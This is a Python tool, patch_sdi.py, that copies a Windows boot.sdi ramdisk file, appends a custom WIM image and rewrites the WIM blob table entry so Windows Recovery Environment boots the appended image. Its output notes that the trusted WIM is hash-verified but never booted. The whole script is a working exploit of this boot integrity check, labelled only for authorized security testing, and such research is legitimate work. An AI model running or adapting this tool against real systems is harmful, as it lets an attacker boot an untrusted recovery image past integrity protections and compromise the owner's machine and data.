#!/usr/bin/env python3
"""
patch_sdi.py - Append a custom WIM to a stock boot.sdi and patch the WIM blob
               offset so the ramdisk boot loader uses the appended WIM.

Usage:
    python patch_sdi.py --sdi boot.sdi --wim custom_winre.wim -o boot_patched.sdi

    The stock boot.sdi is NOT modified. A patched copy is created.
"""

import argparse
import os
import shutil
import struct
import sys

HEADER_SIZE = 512
BLOB_TABLE_OFFSET = 0x200
BLOB_ENTRY_SIZE = 64
BLOB_TABLE_ENTRIES = 64

# Blob entry field offsets within a 64-byte entry
ENTRY_TYPE_OFFSET = 0x00    # 4 bytes ASCII
ENTRY_DATA_OFFSET = 0x10    # UINT64 LE — offset of blob data
ENTRY_DATA_SIZE = 0x18      # UINT64 LE — size of blob data


def align_up(value, alignment):
    return (value + alignment - 1) & ~(alignment - 1)


def find_blob_entry(sdi_data, type_tag):
    # type: (bytes, bytes) -> int
    """
    Find the blob table entry index matching the given type tag.
    Returns the entry index, or -1 if not found.
    """
    for i in range(BLOB_TABLE_ENTRIES):
        offset = BLOB_TABLE_OFFSET + i * BLOB_ENTRY_SIZE
        tag = sdi_data[offset:offset + 4]
        if tag == type_tag:
            return i
    return -1


def get_entry_offset(entry_index):
    # type: (int) -> int
    """Get the absolute file offset of a blob table entry."""
    return BLOB_TABLE_OFFSET + entry_index * BLOB_ENTRY_SIZE


def read_entry_fields(sdi_data, entry_index):
    # type: (bytes, int) -> dict
    """Read the key fields from a blob table entry."""
    base = get_entry_offset(entry_index)
    return {
        "type": sdi_data[base:base + 4],
        "data_offset": struct.unpack_from("<Q", sdi_data, base + ENTRY_DATA_OFFSET)[0],
        "data_size": struct.unpack_from("<Q", sdi_data, base + ENTRY_DATA_SIZE)[0],
    }


def patch_sdi(stock_sdi_path, custom_wim_path, output_path):
    # type: (str, str, str) -> None

    stock_size = os.path.getsize(stock_sdi_path)
    wim_size = os.path.getsize(custom_wim_path)

    print("[*] Stock SDI     : %s (%d bytes, 0x%x)" % (stock_sdi_path, stock_size, stock_size))
    print("[*] Custom WIM    : %s (%d bytes, %.1f MiB)" % (
        custom_wim_path, wim_size, wim_size / (1024 * 1024)))

    # Read the stock SDI to inspect its blob table
    with open(stock_sdi_path, "rb") as f:
        sdi_data = f.read()

    # Validate signature
    if sdi_data[:8] != b"$SDI0001":
        print("[!] WARNING: unexpected signature: %r (expected b'$SDI0001')" % sdi_data[:8])

    # Find the WIM and PART entries
    wim_index = find_blob_entry(sdi_data, b"WIM\x00")
    part_index = find_blob_entry(sdi_data, b"PART")

    if wim_index < 0:
        print("[!] ERROR: no WIM blob entry found in the SDI blob table")
        sys.exit(1)
    if part_index < 0:
        print("[!] ERROR: no PART blob entry found in the SDI blob table")
        sys.exit(1)

    part_fields = read_entry_fields(sdi_data, part_index)
    wim_fields = read_entry_fields(sdi_data, wim_index)

    print("[*] Stock blob table:")
    print("    PART entry #%d : offset=0x%x, size=0x%x (%d bytes)" % (
        part_index, part_fields["data_offset"], part_fields["data_size"], part_fields["data_size"]))
    print("    WIM  entry #%d : offset=0x%x, size=0x%x (%d bytes)" % (
        wim_index, wim_fields["data_offset"], wim_fields["data_size"], wim_fields["data_size"]))

    # ── Calculate where to append the custom WIM ──
    # Align the append position to a page boundary for safety
    append_offset = align_up(stock_size, 0x1000)
    padding_needed = append_offset - stock_size

    # The WIM blob offset in the SDI is the position within the ramdisk
    # buffer where the boot loader will look for the WIM to boot.
    # Since the SDI is loaded at the start of the ramdisk buffer,
    # the offset = position of the appended WIM in the file.
    new_wim_offset = append_offset

    new_total_size = append_offset + wim_size

    print("")
    print("[*] Patch plan:")
    print("    Append custom WIM at file offset 0x%x (after %d bytes padding)" % (
        append_offset, padding_needed))
    print("    Set WIM blob offset to 0x%x (= position in ramdisk buffer)" % new_wim_offset)
    print("    Set WIM blob size to 0x%x (%d bytes)" % (wim_size, wim_size))
    print("    New file size: %d bytes (%.1f MiB)" % (new_total_size, new_total_size / (1024 * 1024)))

    # ── Build the patched file ──
    # 1) Copy the stock SDI
    print("")
    print("[*] Copying stock SDI to %s..." % output_path)
    shutil.copy2(stock_sdi_path, output_path)

    # 2) Append padding + custom WIM
    print("[*] Appending custom WIM...")
    with open(output_path, "ab") as f:
        if padding_needed > 0:
            f.write(b"\x00" * padding_needed)
        with open(custom_wim_path, "rb") as wim_f:
            while True:
                chunk = wim_f.read(1024 * 1024)
                if not chunk:
                    break
                f.write(chunk)

    # 3) Patch the WIM blob entry in the blob table
    print("[*] Patching WIM blob entry (slot #%d)..." % wim_index)
    wim_entry_abs = get_entry_offset(wim_index)

    with open(output_path, "r+b") as f:
        # Write new data offset
        f.seek(wim_entry_abs + ENTRY_DATA_OFFSET)
        f.write(struct.pack("<Q", new_wim_offset))
        # Write new data size
        f.seek(wim_entry_abs + ENTRY_DATA_SIZE)
        f.write(struct.pack("<Q", wim_size))

    # ── Verify ──
    final_size = os.path.getsize(output_path)
    print("")
    print("[+] Patched SDI written: %s (%d bytes)" % (output_path, final_size))
    print("")
    print("[*] Ramdisk buffer layout at boot time:")
    print("    0x%08x  SDI header + blob table" % 0)
    print("    0x%08x  PART data (NTFS volume, %d bytes)" % (
        part_fields["data_offset"], part_fields["data_size"]))
    print("    0x%08x  Custom WIM (appended, %d bytes) <-- WIM blob points here" % (
        new_wim_offset, wim_size))
    print("    0x%08x  Trusted WIM (loaded separately by boot loader)" % final_size)
    print("               ^-- hash verified on this one, but NOT booted")
    print("")
    print("[+] Done! Replace boot.sdi with this file and reboot into WinRE.")
    print("[+] Verify with: python parse_sdi.py %s" % output_path)


def main():
    parser = argparse.ArgumentParser(
        description="Patch a stock boot.sdi to append a custom WIM and redirect "
                    "the WIM blob offset. For authorized security testing only.",
        epilog="Example: python patch_sdi.py --sdi boot.sdi --wim custom_winre.wim -o boot_patched.sdi",
    )
    parser.add_argument("--sdi", required=True,
                        help="Path to the stock boot.sdi file")
    parser.add_argument("--wim", required=True,
                        help="Path to the custom WIM file to append (e.g. modified WinRE.wim)")
    parser.add_argument("-o", "--output", default="boot_patched.sdi",
                        help="Output patched SDI file path (default: boot_patched.sdi)")
    args = parser.parse_args()

    if not os.path.isfile(args.sdi):
        print("Error: stock SDI not found: %s" % args.sdi)
        sys.exit(1)
    if not os.path.isfile(args.wim):
        print("Error: WIM file not found: %s" % args.wim)
        sys.exit(1)
    if os.path.abspath(args.sdi) == os.path.abspath(args.output):
        print("Error: output path must differ from input SDI path")
        sys.exit(1)

    patch_sdi(args.sdi, args.wim, args.output)


if __name__ == "__main__":
    main()
